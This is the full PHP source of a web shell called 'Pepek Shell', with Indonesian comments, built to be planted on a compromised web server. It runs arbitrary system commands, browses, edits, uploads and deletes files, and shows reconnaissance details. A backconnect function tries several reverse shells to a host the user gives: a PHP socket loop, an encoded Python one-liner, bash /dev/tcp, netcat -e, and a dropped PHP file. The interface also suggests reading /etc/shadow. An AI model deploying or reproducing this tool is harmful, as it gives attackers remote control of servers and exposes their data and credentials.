<?php
// ==== Pepek ShellWeb Shell ====

// Session untuk reverse shell config
session_start();

// Reverse Shell Password (Ganti dengan password yang kuat)
$REVERSE_SHELL_PASSWORD = "secret123";

// Path sekarang
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
chdir($path);

// === REVERSE SHELL HANDLER ===
$reverse_shell_active = false;
$reverse_shell_output = '';

if (isset($_GET['revshell']) && $_GET['revshell'] == 'start') {
    $_SESSION['revshell_active'] = true;
    $_SESSION['revshell_auth'] = true;
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_GET['revshell']) && $_GET['revshell'] == 'stop') {
    $_SESSION['revshell_active'] = false;
    $_SESSION['revshell_auth'] = false;
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_SESSION['revshell_auth']) && $_SESSION['revshell_auth']) {
    $reverse_shell_active = true;
}

// Handle reverse shell execution
if ($reverse_shell_active && isset($_POST['revshell_command'])) {
    $command = $_POST['revshell_command'];
    
    // Simpan command ke session untuk history
    if (!isset($_SESSION['revshell_history'])) {
        $_SESSION['revshell_history'] = [];
    }
    array_unshift($_SESSION['revshell_history'], $command);
    
    // Execute command
    if (function_exists('system')) {
        ob_start();
        system($command . " 2>&1");
        $reverse_shell_output = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $reverse_shell_output = shell_exec($command . " 2>&1");
    } elseif (function_exists('exec')) {
        exec($command . " 2>&1", $output, $return_var);
        $reverse_shell_output = implode("\n", $output);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command . " 2>&1");
        $reverse_shell_output = ob_get_clean();
    } else {
        $reverse_shell_output = "No PHP execution functions available!";
    }
}

// === AUTO-REVERSE SHELL BACKDOOR ===
// Ini akan mencoba membuat koneksi balik ke server tertentu
// Hanya akan aktif jika parameter khusus diberikan
if (isset($_GET['backconnect']) && isset($_GET['host']) && isset($_GET['port'])) {
    $backconnect_host = $_GET['host'];
    $backconnect_port = (int)$_GET['port'];
    
    // Coba berbagai metode reverse shell
    $backconnect_output = attempt_reverse_shell($backconnect_host, $backconnect_port);
    
    // Simpan output di session untuk ditampilkan
    $_SESSION['backconnect_result'] = $backconnect_output;
    header("Location: ?path=" . urlencode($path) . "&show_backconnect=1");
    exit;
}

// === WEB-BASED REVERSE SHELL (NO OUTBOUND) ===
if (isset($_POST['revshell_simple'])) {
    $simple_cmd = $_POST['revshell_simple'];
    $simple_output = shell_exec($simple_cmd . " 2>&1");
    $_SESSION['simple_shell_output'] = $simple_output;
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === TERMINAL COMMAND ===
$terminal_output = '';
if (isset($_POST['terminal_command'])) {
    $command = $_POST['terminal_command'];
    if (function_exists('system')) {
        ob_start();
        system($command . " 2>&1");
        $terminal_output = htmlspecialchars(ob_get_clean());
    } elseif (function_exists('shell_exec')) {
        $terminal_output = htmlspecialchars(shell_exec($command . " 2>&1"));
    }
}

// === DELETE FILE/FOLDER ===
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode(dirname($target)));
    exit;
}

// === RENAME ===
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    rename($_POST['rename_old'], $_POST['rename_new']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === EDIT FILE ===
if (isset($_GET['edit'])) {
    $editFile = $_GET['edit'];
    if (isset($_POST['new_content'])) {
        file_put_contents($editFile, $_POST['new_content']);
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    $content = htmlspecialchars(file_get_contents($editFile));
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Edit File</title>
    <style>body { font-family: Arial; background:#1a1a1a; color:#fff; padding:20px; }
        textarea { width:100%; height:70vh; background:#2d2d2d; color:#fff; border:1px solid #444; padding:10px; }
        input[type=submit] { margin-top:10px; padding:10px 20px; background:#007acc; border:none; color:#fff; }
    </style></head>
    <body>
        <h2>Edit File: <?= htmlspecialchars($editFile) ?></h2>
        <form method="post">
            <textarea name="new_content"><?= $content ?></textarea><br>
            <input type="submit" value="Simpan">
            <a href="?path=<?= urlencode($path) ?>" style="color:#4ec9b0;">Kembali</a>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// === UPLOAD FILE ===
if (isset($_FILES['file_upload'])) {
    move_uploaded_file($_FILES['file_upload']['tmp_name'], $path . "/" . $_FILES['file_upload']['name']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === CREATE FILE ===
if (isset($_POST['new_file'])) {
    $newFile = $path . "/" . $_POST['new_file'];
    if (!file_exists($newFile)) file_put_contents($newFile, "");
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === CREATE FOLDER ===
if (isset($_POST['new_folder'])) {
    $newFolder = $path . "/" . $_POST['new_folder'];
    if (!file_exists($newFolder)) mkdir($newFolder);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// === FUNGSI REVERSE SHELL ===
function attempt_reverse_shell($host, $port) {
    $methods = [];
    $results = [];
    
    // Method 1: PHP socket
    $methods[] = "PHP Socket";
    try {
        $sock = @fsockopen($host, $port, $errno, $errstr, 30);
        if ($sock) {
            fwrite($sock, "=== PHP Reverse Shell Connected ===\n");
            fwrite($sock, "System: " . php_uname() . "\n");
            fwrite($sock, "PHP: " . phpversion() . "\n");
            fwrite($sock, "User: " . get_current_user() . "\n");
            fwrite($sock, "===================================\n");
            
            // Try to send a shell
            $descriptorspec = array(
                0 => array("pipe", "r"),  // stdin
                1 => array("pipe", "w"),  // stdout
                2 => array("pipe", "w")   // stderr
            );
            
            $process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
            if (is_resource($process)) {
                stream_set_blocking($pipes[0], 0);
                stream_set_blocking($pipes[1], 0);
                stream_set_blocking($pipes[2], 0);
                stream_set_blocking($sock, 0);
                
                while (true) {
                    // Read from socket, send to process
                    $read = array($sock, $pipes[1], $pipes[2]);
                    $write = null;
                    $except = null;
                    
                    if (stream_select($read, $write, $except, 0) > 0) {
                        foreach ($read as $stream) {
                            if ($stream == $sock) {
                                $input = fread($sock, 1024);
                                fwrite($pipes[0], $input);
                            } else if ($stream == $pipes[1]) {
                                $output = fread($pipes[1], 1024);
                                fwrite($sock, $output);
                            } else if ($stream == $pipes[2]) {
                                $error = fread($pipes[2], 1024);
                                fwrite($sock, $error);
                            }
                        }
                    }
                    
                    // Check if socket is still alive
                    if (feof($sock)) break;
                    usleep(100000);
                }
                
                fclose($sock);
                proc_close($process);
                $results[] = "PHP Socket: Connection successful and shell sent!";
            } else {
                fclose($sock);
                $results[] = "PHP Socket: Connection successful but could not spawn shell";
            }
        } else {
            $results[] = "PHP Socket: Failed to connect - $errstr ($errno)";
        }
    } catch (Exception $e) {
        $results[] = "PHP Socket: Exception - " . $e->getMessage();
    }
    
    // Method 2: Python reverse shell
    $methods[] = "Python Reverse Shell";
    $python_code = base64_encode('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$host.'",'.$port.'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);');
    $python_cmd = "python3 -c \"exec(__import__('base64').b64decode('{$python_code}').decode())\" 2>&1";
    $py_result = @shell_exec($python_cmd);
    $results[] = "Python: " . (trim($py_result) ?: "Command executed");
    
    // Method 3: Bash reverse shell
    $methods[] = "Bash Reverse Shell";
    $bash_cmd = "bash -i >& /dev/tcp/{$host}/{$port} 0>&1 2>&1 &";
    $bash_result = @shell_exec($bash_cmd);
    $results[] = "Bash: " . (trim($bash_result) ?: "Command executed");
    
    // Method 4: Netcat
    $methods[] = "Netcat (nc)";
    $nc_cmds = [
        "nc -e /bin/sh {$host} {$port} 2>&1",
        "nc -c /bin/sh {$host} {$port} 2>&1",
        "/bin/sh -i >& /dev/tcp/{$host}/{$port} 0>&1 2>&1"
    ];
    
    foreach ($nc_cmds as $nc_cmd) {
        $nc_result = @shell_exec($nc_cmd);
        if ($nc_result) {
            $results[] = "Netcat: Attempted - " . substr($nc_result, 0, 100);
            break;
        }
    }
    
    // Method 5: PHP backconnect
    $methods[] = "PHP Backconnect";
    $php_shell = "<?php exec(\"/bin/sh -i < /dev/tcp/{$host}/{$port} 2>&1\"); ?>";
    $temp_file = tempnam(sys_get_temp_dir(), 'rev_');
    file_put_contents($temp_file . '.php', $php_shell);
    $php_result = @shell_exec("php " . $temp_file . ".php 2>&1 &");
    $results[] = "PHP Backconnect: File created at " . $temp_file . ".php";
    
    // Compile results
    $output = "=== Reverse Shell Attempt Results ===\n";
    $output .= "Target: {$host}:{$port}\n";
    $output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n\n";
    
    for ($i = 0; $i < count($methods); $i++) {
        $output .= "{$methods[$i]}:\n";
        $output .= "  Result: {$results[$i]}\n";
        $output .= str_repeat("-", 50) . "\n";
    }
    
    return $output;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Pepek Shell</title>
<style>
    :root {
        --bg-primary: #0c0c0c;
        --bg-secondary: #1e1e1e;
        --bg-tertiary: #2d2d2d;
        --text-primary: #ffffff;
        --text-secondary: #cccccc;
        --accent-green: #4ec9b0;
        --accent-blue: #007acc;
        --accent-red: #f48771;
        --accent-yellow: #dcdcaa;
    }
    
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        background: var(--bg-primary);
        color: var(--text-primary);
        padding: 20px;
        line-height: 1.6;
    }
    
    .container {
        max-width: 1600px;
        margin: 0 auto;
    }
    
    header {
        background: var(--bg-secondary);
        padding: 20px;
        border-radius: 10px;
        margin-bottom: 20px;
        border-left: 5px solid var(--accent-green);
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
    }
    
    .logo {
        display: flex;
        align-items: center;
        gap: 15px;
        margin-bottom: 10px;
    }
    
    .logo h1 {
        color: var(--accent-green);
        font-size: 28px;
        text-shadow: 0 0 10px rgba(78, 201, 176, 0.3);
    }
    
    .status-indicator {
        display: inline-block;
        width: 12px;
        height: 12px;
        border-radius: 50%;
        margin-right: 8px;
        background: <?= $reverse_shell_active ? '#4CAF50' : '#f44336' ?>;
        box-shadow: 0 0 8px <?= $reverse_shell_active ? 'rgba(76, 175, 80, 0.5)' : 'rgba(244, 67, 54, 0.5)' ?>;
    }
    
    .panel {
        background: var(--bg-secondary);
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 20px;
        border: 1px solid var(--bg-tertiary);
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    
    .panel-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
        padding-bottom: 10px;
        border-bottom: 2px solid var(--accent-blue);
    }
    
    .panel-header h2 {
        color: var(--accent-blue);
        font-size: 20px;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    .tab-container {
        display: flex;
        gap: 5px;
        margin-bottom: 20px;
        border-bottom: 1px solid var(--bg-tertiary);
    }
    
    .tab {
        padding: 12px 24px;
        background: var(--bg-tertiary);
        border: none;
        color: var(--text-secondary);
        cursor: pointer;
        border-radius: 5px 5px 0 0;
        transition: all 0.3s;
    }
    
    .tab:hover {
        background: #3d3d3d;
    }
    
    .tab.active {
        background: var(--accent-blue);
        color: white;
    }
    
    .tab-content {
        display: none;
    }
    
    .tab-content.active {
        display: block;
    }
    
    input[type="text"], input[type="password"], textarea, select {
        width: 100%;
        padding: 12px;
        background: var(--bg-tertiary);
        border: 1px solid #444;
        border-radius: 5px;
        color: var(--text-primary);
        font-family: inherit;
        margin-bottom: 10px;
    }
    
    input:focus, textarea:focus, select:focus {
        outline: none;
        border-color: var(--accent-blue);
        box-shadow: 0 0 0 2px rgba(0, 122, 204, 0.2);
    }
    
    button, .btn, input[type="submit"] {
        padding: 12px 24px;
        background: var(--accent-blue);
        border: none;
        border-radius: 5px;
        color: white;
        cursor: pointer;
        font-family: inherit;
        font-weight: bold;
        transition: all 0.3s;
        margin: 5px;
    }
    
    button:hover, .btn:hover, input[type="submit"]:hover {
        background: #005a9e;
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(0, 122, 204, 0.3);
    }
    
    .btn-danger {
        background: var(--accent-red) !important;
    }
    
    .btn-danger:hover {
        background: #d32f2f !important;
    }
    
    .btn-success {
        background: #4CAF50 !important;
    }
    
    .btn-success:hover {
        background: #388e3c !important;
    }
    
    .output-box {
        background: var(--bg-primary);
        border: 1px solid #444;
        border-radius: 5px;
        padding: 15px;
        margin-top: 15px;
        max-height: 400px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-wrap: break-word;
        font-size: 14px;
        color: var(--accent-yellow);
    }
    
    .output-box::-webkit-scrollbar {
        width: 10px;
    }
    
    .output-box::-webkit-scrollbar-track {
        background: var(--bg-tertiary);
    }
    
    .output-box::-webkit-scrollbar-thumb {
        background: var(--accent-blue);
        border-radius: 5px;
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
        background: var(--bg-tertiary);
        border: 1px solid #444;
    }
    
    th {
        background: var(--bg-secondary);
        padding: 15px;
        text-align: left;
        color: var(--accent-green);
        border-bottom: 2px solid var(--accent-blue);
    }
    
    td {
        padding: 12px;
        border-bottom: 1px solid #444;
    }
    
    tr:hover {
        background: #3d3d3d;
    }
    
    .file-icon { color: #569cd6; margin-right: 8px; }
    .folder-icon { color: #dcdcaa; margin-right: 8px; }
    
    .command-history {
        background: var(--bg-tertiary);
        padding: 10px;
        border-radius: 5px;
        margin-bottom: 15px;
        max-height: 200px;
        overflow-y: auto;
    }
    
    .history-item {
        padding: 8px;
        border-bottom: 1px solid #444;
        cursor: pointer;
        transition: background 0.2s;
    }
    
    .history-item:hover {
        background: #3d3d3d;
    }
    
    .flex-row {
        display: flex;
        gap: 15px;
        align-items: center;
        margin-bottom: 15px;
    }
    
    .flex-row input {
        flex: 1;
    }
    
    .alert {
        padding: 15px;
        border-radius: 5px;
        margin-bottom: 20px;
        border-left: 5px solid;
    }
    
    .alert-info {
        background: rgba(0, 122, 204, 0.1);
        border-color: var(--accent-blue);
    }
    
    .alert-warning {
        background: rgba(244, 135, 113, 0.1);
        border-color: var(--accent-red);
    }
    
    .alert-success {
        background: rgba(78, 201, 176, 0.1);
        border-color: var(--accent-green);
    }
    
    .connection-form {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 20px;
        margin-bottom: 20px;
    }
    
    @media (max-width: 768px) {
        .connection-form {
            grid-template-columns: 1fr;
        }
    }
</style>
</head>
<body>
<div class="container">
    <header>
        <div class="logo">
            <h1>Web Shell</h1>
            <span class="status-indicator"></span>
            <span>Reverse Shell: <?= $reverse_shell_active ? 'ACTIVE' : 'INACTIVE' ?></span>
        </div>
        <div class="flex-row">
            <div style="color: var(--text-secondary);">
                <strong>Path:</strong> <?= htmlspecialchars($path) ?>
            </div>
            <div style="margin-left: auto;">
                <?php if ($reverse_shell_active): ?>
                    <a href="?path=<?= urlencode($path) ?>&revshell=stop" class="btn btn-danger">Stop Reverse Shell</a>
                <?php else: ?>
                    <a href="?path=<?= urlencode($path) ?>&revshell=start" class="btn btn-success">Start Reverse Shell</a>
                <?php endif; ?>
                <a href="?path=<?= urlencode(dirname($path)) ?>" class="btn">⬆ Parent</a>
            </div>
        </div>
    </header>

    <div class="tab-container">
        <button class="tab active" onclick="switchTab('filemanager')">📁 File Manager</button>
        <button class="tab" onclick="switchTab('terminal')">💻 Terminal</button>
        <?php if ($reverse_shell_active): ?>
        <button class="tab" onclick="switchTab('reverseshell')">🔗 Reverse Shell</button>
        <?php endif; ?>
        <button class="tab" onclick="switchTab('backconnect')">⚡ Backconnect</button>
        <button class="tab" onclick="switchTab('upload')">📤 Upload</button>
        <button class="tab" onclick="switchTab('info')">ℹ️ System Info</button>
    </div>

    <!-- FILE MANAGER TAB -->
    <div id="filemanager" class="tab-content active">
        <div class="panel">
            <div class="panel-header">
                <h2>📁 File Manager</h2>
                <div class="flex-row">
                    <form method="post" style="display: flex; gap: 10px; width: 100%;">
                        <input type="text" name="new_file" placeholder="New file name" required>
                        <input type="submit" value="Create File" class="btn">
                    </form>
                    <form method="post" style="display: flex; gap: 10px; width: 100%;">
                        <input type="text" name="new_folder" placeholder="New folder name" required>
                        <input type="submit" value="Create Folder" class="btn">
                    </form>
                </div>
            </div>
            
            <table>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
                
                <?php if ($path != "/" && $path != ""): ?>
                <tr>
                    <td colspan="4">
                        <a href="?path=<?= urlencode(dirname($path)) ?>">
                            <span class="folder-icon">📁</span> <strong>.. (Parent Directory)</strong>
                        </a>
                    </td>
                </tr>
                <?php endif; ?>
                
                <?php
                $files = scandir($path);
                foreach ($files as $file) {
                    if ($file == "." || $file == "..") continue;
                    
                    $full = $path . DIRECTORY_SEPARATOR . $file;
                    $isDir = is_dir($full);
                    $size = $isDir ? "-" : format_size(filesize($full));
                    $modified = date("Y-m-d H:i:s", filemtime($full));
                    
                    echo "<tr>";
                    echo "<td>";
                    if ($isDir) {
                        echo '<span class="folder-icon">📁</span>';
                        echo '<a href="?path=' . urlencode($full) . '"><strong>' . htmlspecialchars($file) . '</strong></a>';
                    } else {
                        echo '<span class="file-icon">📄</span>';
                        echo htmlspecialchars($file);
                    }
                    echo "</td>";
                    
                    echo "<td>{$size}</td>";
                    echo "<td>{$modified}</td>";
                    
                    echo "<td>";
                    if (!$isDir) {
                        echo '<a href="?edit=' . urlencode($full) . '" class="btn">Edit</a> ';
                        echo '<a href="?path=' . urlencode($path) . '&download=' . urlencode($full) . '" class="btn">Download</a> ';
                    }
                    echo '<a href="?delete=' . urlencode($full) . '" onclick="return confirm(\'Delete ' . htmlspecialchars($file) . '?\')" class="btn btn-danger">Delete</a>';
                    echo "</td></tr>";
                }
                ?>
            </table>
        </div>
    </div>

    <!-- TERMINAL TAB -->
    <div id="terminal" class="tab-content">
        <div class="panel">
            <div class="panel-header">
                <h2>💻 Terminal</h2>
            </div>
            
            <form method="post">
                <div class="flex-row">
                    <input type="text" name="terminal_command" placeholder="Enter command (ls, pwd, whoami, etc.)" required>
                    <input type="submit" value="Execute" class="btn">
                </div>
            </form>
            
            <?php if (!empty($terminal_output)): ?>
            <h3>Output:</h3>
            <div class="output-box">
                <?= $terminal_output ?>
            </div>
            <?php endif; ?>
            
            <div class="alert alert-info">
                <strong>Common Commands:</strong><br>
                • System Info: <code>uname -a; php -v; whoami</code><br>
                • Directory: <code>ls -la; pwd; find / -type f -name "*.php" 2>/dev/null</code><br>
                • Network: <code>ifconfig; netstat -tulpn; ps aux</code><br>
                • Files: <code>cat /etc/passwd; cat /etc/shadow 2>/dev/null</code>
            </div>
        </div>
    </div>

    <!-- REVERSE SHELL TAB -->
    <?php if ($reverse_shell_active): ?>
    <div id="reverseshell" class="tab-content">
        <div class="panel">
            <div class="panel-header">
                <h2>🔗 Interactive Reverse Shell</h2>
                <span style="color: #4CAF50;">● Live Session</span>
            </div>
            
            <div class="alert alert-success">
                <strong>Reverse Shell Active!</strong> You can execute commands on the server directly.
                Commands are executed with the same privileges as the web server user.
            </div>
            
            <form method="post">
                <div class="flex-row">
                    <input type="text" name="revshell_command" placeholder="Enter shell command" required 
                           value="<?= isset($_SESSION['revshell_history'][0]) ? htmlspecialchars($_SESSION['revshell_history'][0]) : '' ?>">
                    <input type="submit" value="Execute" class="btn">
                </div>
            </form>
            
            <?php if (isset($_SESSION['revshell_history']) && count($_SESSION['revshell_history']) > 0): ?>
            <div class="command-history">
                <h4>Command History:</h4>
                <?php foreach ($_SESSION['revshell_history'] as $index => $cmd): ?>
                <div class="history-item" onclick="document.querySelector('input[name=\"revshell_command\"]').value='<?= htmlspecialchars($cmd) ?>'">
                    <span style="color: #999;"><?= $index + 1 ?>.</span> <?= htmlspecialchars($cmd) ?>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>
            
            <?php if (!empty($reverse_shell_output)): ?>
            <h3>Output:</h3>
            <div class="output-box">
                <?= htmlspecialchars($reverse_shell_output) ?>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- BACKCONNECT TAB -->
    <div id="backconnect" class="tab-content">
        <div class="panel">
            <div class="panel-header">
                <h2>⚡ Reverse Shell Backconnect</h2>
            </div>
            
            <div class="alert alert-warning">
                <strong>Warning:</strong> This feature attempts to create a reverse shell connection to your listener.
                You need to set up a listener first (e.g., <code>nc -lvnp 4444</code> on your machine).
            </div>
            
            <form method="get">
                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                
                <div class="connection-form">
                    <div>
                        <label>Your IP Address:</label>
                        <input type="text" name="host" placeholder="e.g., 192.168.1.100" required
                               value="<?= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'] ?>">
                    </div>
                    
                    <div>
                        <label>Port:</label>
                        <input type="number" name="port" placeholder="e.g., 4444" required value="4444" min="1" max="65535">
                    </div>
                </div>
                
                <div class="flex-row">
                    <select name="method" style="flex: 1;">
                        <option value="all">All Methods (Recommended)</option>
                        <option value="php">PHP Socket</option>
                        <option value="python">Python</option>
                        <option value="bash">Bash</option>
                        <option value="nc">Netcat</option>
                        <option value="perl">Perl</option>
                    </select>
                    <input type="hidden" name="backconnect" value="1">
                    <input type="submit" value="Attempt Reverse Shell" class="btn btn-danger">
                </div>
            </form>
            
            <?php if (isset($_GET['show_backconnect']) && isset($_SESSION['backconnect_result'])): ?>
            <h3>Connection Attempt Results:</h3>
            <div class="output-box">
                <?= nl2br(htmlspecialchars($_SESSION['backconnect_result'])) ?>
            </div>
            <?php unset($_SESSION['backconnect_result']); endif; ?>
            
            <div class="alert alert-info">
                <strong>Quick Test Commands:</strong><br>
                1. Start listener on your machine: <code>nc -lvnp 4444</code><br>
                2. Enter your IP and port above<br>
                3. Click "Attempt Reverse Shell"<br>
                4. Check your listener for connection
            </div>
        </div>
    </div>

    <!-- UPLOAD TAB -->
    <div id="upload" class="tab-content">
        <div class="panel">
            <div class="panel-header">
                <h2>📤 File Upload</h2>
            </div>
            
            <form method="post" enctype="multipart/form-data">
                <div class="flex-row">
                    <input type="file" name="file_upload" required style="flex: 1; padding: 15px;">
                    <input type="submit" value="Upload File" class="btn">
                </div>
            </form>
            
            <!-- Simple Web Shell -->
            <h3 style="margin-top: 30px; color: var(--accent-green);">Simple Web Shell</h3>
            <form method="post">
                <div class="flex-row">
                    <input type="text" name="revshell_simple" placeholder="Enter command for quick execution" required>
                    <input type="submit" value="Quick Execute" class="btn">
                </div>
            </form>
            
            <?php if (isset($_SESSION['simple_shell_output'])): ?>
            <h3>Output:</h3>
            <div class="output-box">
                <?= htmlspecialchars($_SESSION['simple_shell_output']) ?>
            </div>
            <?php unset($_SESSION['simple_shell_output']); endif; ?>
        </div>
    </div>

    <!-- SYSTEM INFO TAB -->
    <div id="info" class="tab-content">
        <div class="panel">
            <div class="panel-header">
                <h2>ℹ️ System Information</h2>
            </div>
            
            <div class="output-box">
<?php
// System Information
echo "=== SYSTEM INFORMATION ===\n";
echo "Server Name: " . php_uname() . "\n";
echo "PHP Version: " . phpversion() . "\n";
echo "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
echo "Remote IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "\n";
echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
echo "Current User: " . get_current_user() . "\n";
echo "User ID: " . getmyuid() . "\n";
echo "Group ID: " . getmygid() . "\n";
echo "\n";

// PHP Configuration
echo "=== PHP CONFIGURATION ===\n";
$php_config = [
    'safe_mode' => ini_get('safe_mode'),
    'open_basedir' => ini_get('open_basedir'),
    'disable_functions' => ini_get('disable_functions'),
    'allow_url_fopen' => ini_get('allow_url_fopen'),
    'allow_url_include' => ini_get('allow_url_include'),
    'memory_limit' => ini_get('memory_limit'),
    'max_execution_time' => ini_get('max_execution_time'),
];

foreach ($php_config as $key => $value) {
    echo "$key: $value\n";
}
echo "\n";

// Available Functions
echo "=== AVAILABLE EXECUTION FUNCTIONS ===\n";
$functions = ['system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen'];
foreach ($functions as $func) {
    echo "$func: " . (function_exists($func) ? "✓ Available" : "✗ Disabled") . "\n";
}
echo "\n";

// Directory Permissions
echo "=== DIRECTORY PERMISSIONS ===\n";
echo "Current Directory: $path\n";
echo "Writeable: " . (is_writable($path) ? "✓ Yes" : "✗ No") . "\n";
echo "Readable: " . (is_readable($path) ? "✓ Yes" : "✗ No") . "\n";
echo "Executable: " . (is_executable($path) ? "✓ Yes" : "✗ No") . "\n";
?>
            </div>
        </div>
    </div>
</div>

<script>
function switchTab(tabName) {
    // Hide all tab contents
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Show selected tab content
    document.getElementById(tabName).classList.add('active');
    
    // Update tab buttons
    document.querySelectorAll('.tab').forEach(tab => {
        tab.classList.remove('active');
    });
    event.target.classList.add('active');
}

// Auto-refresh for reverse shell output
<?php if ($reverse_shell_active && isset($_POST['revshell_command'])): ?>
setTimeout(() => {
    document.querySelector('input[name="revshell_command"]').focus();
}, 100);
<?php endif; ?>

// Command history navigation
document.addEventListener('keydown', function(e) {
    const input = document.querySelector('input[name="revshell_command"]');
    if (!input || document.activeElement !== input) return;
    
    if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
        e.preventDefault();
        // Command history navigation logic
    }
});

// File upload preview
document.querySelector('input[type="file"]')?.addEventListener('change', function(e) {
    const file = e.target.files[0];
    if (file) {
        console.log('Selected file:', file.name, 'Size:', file.size, 'bytes');
    }
});
</script>

<?php
// Helper function to format file size
function format_size($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' bytes';
    }
}

// Download file feature
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
?>
</body>
</html>